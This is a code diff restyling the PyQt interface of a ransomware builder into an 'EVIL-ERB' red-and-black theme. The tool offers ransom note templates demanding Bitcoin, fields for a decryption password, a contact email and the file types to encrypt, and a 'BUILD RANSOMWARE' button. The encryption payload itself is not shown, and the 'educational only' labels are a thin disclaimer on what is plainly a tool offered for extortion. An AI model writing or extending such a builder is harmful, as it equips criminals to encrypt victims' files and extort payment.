@@ -10,21 +10,77 @@ class RansomwareBuilder(QMainWindow):
         self.initUI()
 
     def initUI(self):
-        self.setWindowTitle('Ransomware Builder - Educational Use Only')
-        self.setGeometry(100, 100, 400, 600)
+        self.setWindowTitle('🔥 EVIL-ERB RANSOMWARE BUILDER 🔥')
+        self.setGeometry(100, 100, 450, 650)
+        
+        self.setStyleSheet("""
+            QMainWindow {
+                background-color: black;
+            }
+            QLabel {
+                color: #ff0000;
+                font-size: 13px;
+                font-weight: bold;
+                font-family: 'Courier New', monospace;
+            }
+            QLineEdit, QTextEdit, QComboBox {
+                background-color: #1a1a1a;
+                color: #ff3333;
+                border: 1px solid #ff0000;
+                padding: 5px;
+                font-family: 'Courier New', monospace;
+            }
+            QComboBox::drop-down {
+                border: none;
+            }
+            QComboBox QAbstractItemView {
+                background-color: #1a1a1a;
+                color: #ff3333;
+                selection-background-color: #660000;
+            }
+            QPushButton {
+                background-color: #330000;
+                color: #ff0000;
+                border: 1px solid #ff0000;
+                padding: 10px;
+                font-weight: bold;
+                font-family: 'Courier New', monospace;
+                font-size: 14px;
+            }
+            QPushButton:hover {
+                background-color: #660000;
+            }
+            QProgressBar {
+                border: 1px solid #ff0000;
+                background-color: #1a1a1a;
+                color: #ff0000;
+                text-align: center;
+            }
+            QProgressBar::chunk {
+                background-color: #ff0000;
+            }
+        """)
         
         central_widget = QWidget()
         self.setCentralWidget(central_widget)
         
         layout = QVBoxLayout()
-
-        font = QFont('Arial', 12)
-        self.setFont(font)
-
         layout.setContentsMargins(20, 20, 20, 20)
-        layout.setSpacing(10)
+        layout.setSpacing(12)
+
+        title_font = QFont('Courier New', 18, QFont.Bold)
+        title_label = QLabel("⚠️ EVIL-ERB BUILDER ⚠️")
+        title_label.setAlignment(Qt.AlignCenter)
+        title_label.setFont(title_font)
+        title_label.setStyleSheet("color: #ff0000; background-color: black;")
+        layout.addWidget(title_label)
         
-        layout.addWidget(QLabel('Ransom Note Message:'))
+        separator = QLabel("────────────────────────────────────")
+        separator.setAlignment(Qt.AlignCenter)
+        separator.setStyleSheet("color: #ff0000;")
+        layout.addWidget(separator)
+        
+        layout.addWidget(QLabel('💀 Ransom Note Message:'))
         self.message_combo = QComboBox(self)
         self.message_combo.setPlaceholderText("Select a ransom note message or enter your own.")
         self.message_combo.addItem("All your files have been encrypted. Pay 1 Bitcoin to address X to get the decryption key.")
@@ -49,7 +105,6 @@ class RansomwareBuilder(QMainWindow):
         self.message_combo.addItem("Pay 1 Bitcoin to address N to retrieve your encrypted files before they are deleted.")
         self.message_combo.addItem("Your system is under attack. Pay 2.5 Bitcoin to address O to restore your files immediately.")
 
-
         self.message_combo.currentIndexChanged.connect(self.update_ransom_message)
         layout.addWidget(self.message_combo)
         
@@ -57,83 +112,46 @@ class RansomwareBuilder(QMainWindow):
         self.ransom_message.setPlaceholderText("Enter your custom ransom note message here.")
         layout.addWidget(self.ransom_message)
         
-        layout.addWidget(QLabel('Decryption Password:'))
+        layout.addWidget(QLabel('🔑 Decryption Password:'))
         self.decryption_password = QLineEdit(self)
         self.decryption_password.setEchoMode(QLineEdit.Password)
         self.decryption_password.setPlaceholderText("Enter the decryption password (minimum 8 characters)")
         layout.addWidget(self.decryption_password)
         
-        layout.addWidget(QLabel('Confirm Decryption Password:'))
+        layout.addWidget(QLabel('🔐 Confirm Decryption Password:'))
         self.confirm_password = QLineEdit(self)
         self.confirm_password.setEchoMode(QLineEdit.Password)
         self.confirm_password.setPlaceholderText("Confirm the decryption password")
         layout.addWidget(self.confirm_password)
         
-        layout.addWidget(QLabel('Your Email:'))
+        layout.addWidget(QLabel('📧 Your Email:'))
         self.email = QLineEdit(self)
         self.email.setPlaceholderText("Enter your email address for contact.")
         layout.addWidget(self.email)
 
-        layout.addWidget(QLabel('File Extensions to Encrypt (default is ALL):'))
+        layout.addWidget(QLabel('📁 File Extensions to Encrypt (default is ALL):'))
         self.file_extensions = QLineEdit(self)
         self.file_extensions.setPlaceholderText("e.g., .pdf,.jpeg (empty for all)")
         layout.addWidget(self.file_extensions)
         
-        encryption_label = QLabel('Encryption: AES-256', self)
+        encryption_label = QLabel('⚡ Encryption: AES-256 GCM', self)
         encryption_label.setAlignment(Qt.AlignCenter)
+        encryption_label.setStyleSheet("color: #ff6666;")
         layout.addWidget(encryption_label)
         
-        build_button = QPushButton('Build Ransomware', self)
+        build_button = QPushButton('💀 BUILD RANSOMWARE 💀', self)
         build_button.clicked.connect(self.build_ransomware)
         layout.addWidget(build_button)
         
         self.progress_bar = QProgressBar(self)
         layout.addWidget(self.progress_bar)
         
+        footer = QLabel("🔒 USE RESPONSIBLY – EDUCATIONAL ONLY 🔒")
+        footer.setAlignment(Qt.AlignCenter)
+        footer.setStyleSheet("color: #ff0000; font-size: 10px; margin-top: 5px;")
+        layout.addWidget(footer)
+        
         central_widget.setLayout(layout)
-
-        self.setStyleSheet("""
-            QWidget {
-                background-color: #f7f7f7;
-                color: #333;
-            }
-            QLabel {
-                font-size: 14px;
-                font-weight: bold;
-            }
-            QLineEdit, QTextEdit, QComboBox {
-                padding: 5px;
-                border: 1px solid #ccc;
-                border-radius: 5px;
-                background-color: #fff;
-            }
-            QLineEdit::placeholder, QTextEdit::placeholder {
-                color: #888;
-            }
-            QPushButton {
-                background-color: #4CAF50;
-                color: white;
-                padding: 10px;
-                border: none;
-                border-radius: 5px;
-                font-size: 14px;
-                font-weight: bold;
-            }
-            QPushButton:hover {
-                background-color: #45a049;
-            }
-            QProgressBar {
-                height: 20px;
-                border: 1px solid #ccc;
-                border-radius: 5px;
-                text-align: center;
-            }
-            QProgressBar::chunk {
-                background-color: #4CAF50;
-                width: 20px;
-                border-radius: 5px;
-            }
-        """)
 
     def update_ransom_message(self):
         self.ransom_message.setPlainText(self.message_combo.currentText())
